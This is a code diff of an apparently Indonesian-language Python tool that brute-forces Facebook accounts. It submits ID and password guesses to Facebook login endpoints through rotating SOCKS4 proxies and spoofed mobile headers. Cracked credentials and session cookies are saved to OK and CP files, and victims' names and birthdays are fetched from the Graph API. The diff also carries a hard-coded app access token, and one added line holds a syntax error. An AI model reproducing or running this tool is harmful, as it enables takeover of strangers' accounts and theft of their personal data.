@@ -751,14 +751,14 @@ def mobile(uiz,pwr):
 						ttl = x['birthday']
 						nama_ = x["name"]
 						#id_ = x["id"]
-						print("\r %s*--> %s|%s|%s "%(K,uiz,pw,ttl))
-						open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+						print("\r %s*--> %s|%s|%s|%s "%(K,nama_,uiz,pw,ttl))
+						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
 					print("\r %s*--> %s|%s "%(K,uiz,pw))
-					open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 					cp+=1
 				else:continue
 				break
@@ -781,7 +781,8 @@ def mobile(uiz,pwr):
 						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
 						x = json.loads(xn.text)
 						ttl = x['birthday']
-						print("\r %s*--> %s|%s|%s "%(H,uiz,pw,ttl))
+						nama_ = x["name"]
+						print("\r %s*--> %s|%s|%s|%s "%(H,nama_,uiz,pw,ttl))
 						print("\r %s*--> %s "%(H,kuki))
 						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 						ok+=1
@@ -879,14 +880,14 @@ def mobile_v2(uiz,pwr):
 						ttl = x['birthday']
 						nama_ = x["name"]
 						#id_ = x["id"]
-						print("\r %s*--> %s|%s|%s "%(K,uiz,pw,ttl))
-						open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+						print("\r %s*--> %s|%s|%s|%s "%(K,nama_,uiz,pw,ttl))
+						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
 					print("\r %s*--> %s|%s "%(K,uiz,pw))
-					open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 					cp+=1
 				else:continue
 				break
@@ -909,7 +910,8 @@ def mobile_v2(uiz,pwr):
 						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
 						x = json.loads(xn.text)
 						ttl = x['birthday']
-						print("\r %s*--> %s|%s|%s "%(H,uiz,pw,ttl))
+						nama_ = x["name"]
+						print("\r %s*--> %s|%s|%s|%s "%(H,nama_,uiz,pw,ttl))
 						print("\r %s*--> %s "%(H,kuki))
 						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 						ok+=1
@@ -967,14 +969,14 @@ def mbasic(uiz,pwr):
 						ttl = x['birthday']
 						nama_ = x["name"]
 						#id_ = x["id"]
-						print("\r %s*--> %s|%s|%s "%(K,uiz,pw,ttl))
-						open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+						print("\r %s*--> %s|%s|%s|%s "%(K,nama_,uiz,pw,ttl))
+						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
 					print("\r %s*--> %s|%s "%(K,uiz,pw))
-					open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 					cp+=1
 				else:continue
 				break
@@ -997,7 +999,8 @@ def mbasic(uiz,pwr):
 						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
 						x = json.loads(xn.text)
 						ttl = x['birthday']
-						print("\r %s*--> %s|%s|%s "%(H,uiz,pw,ttl))
+						nama_ = x["name"]
+						print("\r %s*--> %s|%s|%s|%s "%(H,nama_,uiz,pw,ttl))
 						print("\r %s*--> %s "%(H,kuki))
 						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 						ok+=1
@@ -1054,14 +1057,14 @@ def free(uiz,pwr):
 						ttl = x['birthday']
 						nama_ = x["name"]
 						#id_ = x["id"]
-						print("\r %s*--> %s|%s|%s "%(K,uiz,pw,ttl))
-						open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+						print("\r %s*--> %s|%s|%s|%s "%(K,nama_,uiz,pw,ttl))
+						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
 					print("\r %s*--> %s|%s "%(K,uiz,pw))
-					open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 					cp+=1
 				else:continue
 				break
@@ -1084,7 +1087,8 @@ def free(uiz,pwr):
 						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
 						x = json.loads(xn.text)
 						ttl = x['birthday']
-						print("\r %s*--> %s|%s|%s "%(H,uiz,pw,ttl))
+						nama_ = x ji["name"]
+						print("\r %s*--> %s|%s|%s|%s "%(H,nama_,uiz,pw,ttl))
 						print("\r %s*--> %s "%(H,kuki))
 						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 						ok+=1
@@ -1119,15 +1123,59 @@ def api(uiz,pwr):
 		proxs= {'http': 'socks4://'+cuukk}
 		headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua, "content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
 		response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uiz)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers,proxies=proxs) 
-		if "session_key" in response.text and "EAAB" in response.text:
-			print(f"\r{H}*--> {uid}|{pw}")
-			open('OK/'+okz,'a').write(uiz+'|'+pw+'\n')
-			ok+=1
+		if "session_key" in response.text and "EAAG" in response.text:
+			if "no" in tampilkan_ttl:
+				print("\r %s*--> %s|%s "%(H,uiz,pw))
+				open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+'\n')
+				ok+=1
+				break
+			elif "ya" in tampilkan_ttl:
+				try:
+					token = open('token.txt','r').read()
+					cookie = open('cookie.txt','r').read()
+					coki = {"cookie":cookie}
+					xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+					x = json.loads(xn.text)
+					ttl = x['birthday']
+					nama_ = x["name"]
+						#id_ = x["id"]
+					print("\r %s*--> %s|%s|%s|%s "%(H,nama_,uiz,pw,ttl))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'\n')
+					break
+				except(KeyError, IOError):
+					ttl = " "
+				except:pass
+				print("\r %s*--> %s|%s "%(H,uiz,pw))
+				open('OK/'+okz,'a').write(uiz+'|'+pw+'\n')
+				ok+=1
+			else:continue
 			break
 		elif "www.facebook.com" in response.json()["error_msg"]:
-			print(f"\r{K}*--> {uiz}|{pw}")
-			open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
-			cp+=1
+			if "no" in tampilkan_ttl:
+				print("\r %s*--> %s|%s "%(K,uiz,pw))
+				open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
+				cp+=1
+				break
+			elif "ya" in tampilkan_ttl:
+				try:
+					token = open('token.txt','r').read()
+					cookie = open('cookie.txt','r').read()
+					coki = {"cookie":cookie}
+					xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+					x = json.loads(xn.text)
+					ttl = x['birthday']
+					nama_ = x["name"]
+						#id_ = x["id"]
+					print("\r %s*--> %s|%s|%s|%s "%(K,nama_,uiz,pw,ttl))
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
+					break
+				except(KeyError, IOError):
+					ttl = " "
+				except:pass
+				print("\r %s*--> %s|%s "%(K,uiz,pw))
+				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
+				cp+=1
+			else:continue
 			break
 		else:
 			continue
